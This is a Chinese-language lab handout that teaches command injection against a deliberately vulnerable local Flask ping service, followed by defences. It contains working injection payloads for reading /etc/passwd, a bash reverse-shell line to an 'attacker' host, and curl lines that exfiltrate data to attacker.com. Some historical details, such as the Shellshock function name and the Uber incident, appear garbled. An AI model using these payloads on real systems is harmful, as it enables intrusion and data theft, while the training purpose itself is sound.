# Lab07：命令注入

## 学习目标

1. 理解命令注入的原理（`shell=True` 与字符串拼接的危险）
2. 掌握命令注入的利用方式（多命令执行、管道、重定向）
3. 理解参数化命令执行的安全实现
4. 学会在无法直接回显时使用时间盲注验证注入

## 预备知识

### 命令注入的历史

**2019 年 Uber 安全事件**：攻击者通过 `?cmde` 参数执行系统命令，获取了 5700 万用户数据。

**2014 年 Shellshock**：Bash 的 `genenviron()` 函数处理环境变量时存在缺陷，攻击者通过 CGI 脚本注入恶意环境变量。波及数亿台 Linux 服务器。

**OWASP 2021**：命令注入排名第三（Injection 第三位）。

### 核心问题：`shell=True` 让用户输入进入 Shell 解析器

```python
# 危险代码
cmd = f"ping -c 1 {user_input}"  # user_input = "127.0.0.1; cat /etc/passwd"
subprocess.run(cmd, shell=True)   # shell=True = 用 /bin/sh 解析整个字符串

# 安全代码
subprocess.run(["ping", "-c", "1", user_input])  # 列表参数，完全不经过 shell
```

## 实验环境

```bash
./reset-lab.sh lab07
```

**目标**：`http://127.0.0.1:8087`

**漏洞代码**（`services/cmd-lab/app.py`）：

```python
import subprocess
from flask import Flask, request

app = Flask(__name__)

@app.get("/")
def index():
    target = request.args.get("host", "127.0.0.1")
    cmd = f"ping -c 1 {target}"   # ← 危险！用户输入直接拼到 shell 命令
    result = subprocess.run(cmd, shell=True, text=True, stdout=PIPE, stderr=STDOUT, timeout=5)
    return f"<pre>{result.stdout}</pre>"

app.run(host="0.0.0.0", port=8080)
```

**漏洞原理**：用户可以通过 `host` 参数注入任意命令，因为 `shell=True` 让 `/bin/sh` 解析整个命令字符串。

```
正常请求：ping -c 1 127.0.0.1
注入请求：ping -c 1 127.0.0.1; cat /etc/passwd
           ──────────── 命令1 ────; ──────────── 命令2 ────
                        /bin/sh 会先执行 ping，再执行 cat
```

## 操作步骤

### 步骤 1：确认服务可用

```bash
# 测试正常 ping 功能
curl "http://127.0.0.1:8087/?host=127.0.0.1"

# 观察：
# 1. 页面是否显示 "ping -c 1 127.0.0.1" 的输出
# 2. HTML 响应是否包含 <pre> 标签包裹的 ping 结果
# 3. 是否有命令注入漏洞（输出中是否包含额外内容）
```

**预期输出**：
```html
<h1>Command Lab</h1>
<form><input name="host" value="127.0.0.1"><button>Ping</button></form>
<pre>PING 127.0.0.1 (127.0.0.1): 56 data bytes
64 bytes from 127.0.0.1: seq=0 ttl=64 time=0.048 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 packets received, 0% packet loss
</pre>
```

### 步骤 2：测试命令注入（多命令执行）

```bash
# 注入 1：使用分号 ; 执行额外命令
curl "http://127.0.0.1:8087/?host=127.0.0.1;id"

# 注入 2：使用管道 | 执行额外命令
curl "http://127.0.0.1:8087/?host=127.0.0.1|id"

# 注入 3：使用反引号 ` 或 $() 执行命令
curl "http://127.0.0.1:8087/?host=127.0.0.1\`id\`"
```

**观察要点**：
- 响应中是否出现了 `uid=` 开头的用户信息？
- 如果出现 `uid=0(root)`，说明是 root 权限
- 如果出现 `uid=33(www-data)`，说明是 Web 服务运行的用户

**记录**：
```
Payload：;id
响应输出：[粘贴包含 uid 的输出]
注入是否成功：✅ / ❌
当前用户身份：[uid=..., gid=..., groups=...]
```

### 步骤 3：读取敏感文件

```bash
# 注入 4：读取 /etc/passwd
curl "http://127.0.0.1:8087/?host=127.0.0.1;cat+/etc/passwd"

# 注入 5：查看进程列表
curl "http://127.0.0.1:8087/?host=127.0.0.1;ps+aux"

# 注入 6：查看当前目录和文件
curl "http://127.0.0.1:8087/?host=127.0.0.1;ls+-la"
```

**记录**：
```
/etc/passwd 内容摘要：
[粘贴前 10 行，显示哪些用户存在]

ps aux 输出摘要：
[粘贴关键进程，如数据库服务、SSH 服务等]
```

### 步骤 4：测试时间盲注（无回显验证）

如果命令执行结果不在页面回显，使用时间盲注验证：

```bash
# 时间盲注 1：注入 sleep 命令
# 如果响应延迟约 5 秒，说明命令注入成功
time curl "http://127.0.0.1:8087/?host=127.0.0.1;sleep+5"

# 时间盲注 2：结合命令替换
# 如果 1=1（真），执行 sleep(5)；如果 1=2（假），不执行
# 通过响应时间判断条件真假
time curl "http://127.0.0.1:8087/?host=127.0.0.1;if+1=1+then+sleep+5;fi"
```

**观察**：
- 响应时间是否显著增加（约 5 秒）？
- 如果延迟，说明命令确实被执行了（`sleep 5` 成功）
- 如果没有延迟，可能过滤了某些字符或命令

### 步骤 5：了解容器环境限制

```bash
# 查看当前用户
curl "http://127.0.0.1:8087/?host=127.0.0.1;echo+\$(id)"

# 查看文件系统（了解这是 Docker 容器）
curl "http://127.0.0.1:8087/?host=127.0.0.1;df+-h"

# 查看网络配置
curl "http://127.0.0.1:8087/?host=127.0.0.1;ip+addr"
```

**观察**：
- 是否是 Docker 容器？（`/proc/1/cgroup` 中会有 docker 标识）
- 文件系统是否受限？（可能没有写权限到某些目录）
- 网络是否是 `127.0.0.1` 隔离？

### 步骤 6：尝试反向 shell（可能受限）

```bash
# ⚠️ 警告：这个实验环境中，外部网络连接可能不可用
# 仅作为学习，实际攻击时需要合适的网络条件

# 反向 shell 尝试（Lab 环境可能失败，这是正常的）
curl "http://127.0.0.1:8087/?host=127.0.0.1;bash+-i+>%26+/dev/tcp/attacker/4444+0>%261"
```

**注意**：在本地实验环境中，反向 shell 会失败，因为容器没有外部网络。这是安全的隔离设计。

## 技术原理

### 为什么 `shell=True` 危险？

```
subprocess.run(["ping", "-c", "1", user_input])
         参数列表 ──── 不经过 shell
         user_input = "127.0.0.1; id"
         实际执行：ping -c 1 "127.0.0.1; id"
         参数 ping 收到的是字符串 "127.0.0.1; id" 作为整体
         不会执行分号后的命令

subprocess.run(f"ping -c 1 {user_input}", shell=True)
         shell 解析 ──── /bin/sh 执行整个字符串
         user_input = "127.0.0.1; id"
         实际执行：/bin/sh -c "ping -c 1 127.0.0.1; id"
                   ────────────────────────────────────
                   分号是 shell 的命令分隔符
                   ; 后面的 id 被当作第二个命令执行
```

### 常见的 Shell 注入字符

| 字符 | 说明 | 示例 |
|------|------|------|
| `;` | 命令分隔符（顺序执行） | `cmd1; cmd2` |
| `\|` | 管道（cmd1 输出传给 cmd2） | `cmd1 \| cmd2` |
| `&` | 后台执行 | `cmd1 & cmd2` |
| `&&` | 前一个成功才执行后一个 | `cmd1 && cmd2` |
| `\|\|` | 前一个失败才执行后一个 | `cmd1 \|\| cmd2` |
| `$()` | 命令替换 | `$(id)` |
| `` ` ` `` | 反引号命令替换 | `` `id` `` |
| `>` | 输出重定向 | `cmd > /tmp/out` |
| `<` | 输入重定向 | `cmd < /tmp/in` |

### 参数化命令的安全实现

```python
# ❌ 危险：shell=True + 字符串拼接
cmd = f"ping -c 1 {user_input}"
subprocess.run(cmd, shell=True)

# ✅ 安全：shell=False + 列表参数
subprocess.run(["ping", "-c", "1", user_input])
# user_input 即使是 "127.0.0.1; id" 也只是 ping 的参数
# 不会被 shell 解析

# ✅ 更安全：输入白名单验证
import re
def validate_host(host):
    if not re.match(r'^[a-zA-Z0-9.\-]+$', host):
        return None  # 拒绝无效输入
    return host
```

## 防御方案

### 1. 绝对避免 shell=True

```python
# 替换 shell=True 的所有场景
import shlex

# 如果必须使用 shell=True 的场景（罕见），先转义
cmd = f"ping -c 1 {shlex.quote(user_input)}"
subprocess.run(cmd, shell=True)  # 仍然危险，仅作为最后手段
```

### 2. 白名单输入验证

```python
import re

ALLOWED_HOST_PATTERN = re.compile(r'^[a-zA-Z0-9][a-zA-Z0-9.\-]{0,255}$')

def validate_host(host: str) -> str | None:
    if not host:
        return None
    if not ALLOWED_HOST_PATTERN.match(host):
        return None
    # 额外检查：不能包含任何 shell 特殊字符
    shell_chars = ';&|`$<>{}[]!?#~%*'
    if any(c in host for c in shell_chars):
        return None
    return host
```

### 3. 权限隔离

```python
import os, pwd

# 创建低权限用户运行 Web 服务
# docker-compose.yml 中：
#   user: "33:33"  (www-data:www-data)

# 在代码中使用非特权用户执行危险命令
def run_ping_as_unprivileged(host):
    # 降权执行
    result = subprocess.run(
        ["ping", "-c", "1", host],
        preexec_fn=lambda: os.setuid(pwd.getpwnam("nobody")[2])
    )
```

### 4. 命令超时

```python
# 防止命令注入导致的长时间占用
try:
    result = subprocess.run(
        ["ping", "-c", "1", host],
        shell=False,
        timeout=5  # 5 秒超时
    )
except subprocess.TimeoutExpired:
    return "Command timed out"
```

## 思考题

### 思考题 1：shell=True 和 shell=False 的本质区别

**问题**：用具体示例说明为什么 `shell=False` 能阻止命令注入？

**扩展**：即使使用 `shell=False`，如果程序逻辑本身有漏洞（如 `eval()`、`exec()`），是否仍然存在代码执行风险？举例说明。

### 思考题 2：盲注命令注入的验证方法

**场景**：目标服务器的响应页面不显示命令输出，你注入 `id` 命令后页面只显示 "OK"。

**问题**：
1. 除了 `sleep` 延迟，还有哪些方法可以验证命令是否执行？
2. 如何通过 DNS 请求或 HTTP 请求"带出"命令输出？（提示：`curl http://attacker.com/?output=$(id)`）
3. 如果目标禁止访问外部网络（无 DNS、无 HTTP），如何在本地验证注入成功？

### 思考题 3：过滤特殊字符是否能完全防止命令注入？

**假设**：开发者过滤了 `;`、`|`、`&`、`` `$ ``、`'`、`` `" `` 等所有 shell 特殊字符。

**问题**：
1. 是否还有其他方式实现命令注入？（提示：考虑文件名、路径、环境变量、重定向）
2. 假设输入只允许 `[a-zA-Z0-9.-]`，攻击者是否完全无法利用？
3. 如果允许输入 `/bin/ping`（路径），是否可以绕过限制？

### 思考题 4：命令注入 vs. 代码注入 vs. SQL 注入

**问题**：比较三种注入的异同：

| 方面 | 命令注入 | 代码注入 | SQL 注入 |
|------|---------|---------|---------|
| 注入目标 | ? | ? | ? |
| 根本原因 | ? | ? | ? |
| 最有效防御 | ? | ? | ? |
| 危害范围 | ? | ? | ? |

## 交付物

1. **命令注入测试截图** — 至少 3 种不同的注入 payload 和响应
2. **敏感文件读取证据** — `/etc/passwd` 或其他系统文件内容
3. **时间盲注验证** — 证明 sleep 延迟响应
4. **漏洞代码标注** — 在 `app.py` 中指出危险代码行
5. **安全修复代码** — 用 `shell=False` + 白名单重写危险代码
6. **思考题答案**

## 工具速查

```bash
# 正常请求
curl "http://127.0.0.1:8087/?host=127.0.0.1"

# 命令注入测试
curl "http://127.0.0.1:8087/?host=127.0.0.1;id"
curl "http://127.0.0.1:8087/?host=127.0.0.1|id"
curl "http://127.0.0.1:8087/?host=127.0.0.1&&id"
curl "http://127.0.0.1:8087/?host=127.0.0.1;cat+/etc/passwd"
curl "http://127.0.0.1:8087/?host=127.0.0.1;ls+/opt"

# 时间盲注
time curl "http://127.0.0.1:8087/?host=127.0.0.1;sleep+5"

# 盲注验证（DNS 带外）
curl "http://127.0.0.1:8087/?host=127.0.0.1;curl+\$(whoami).attacker.com"
```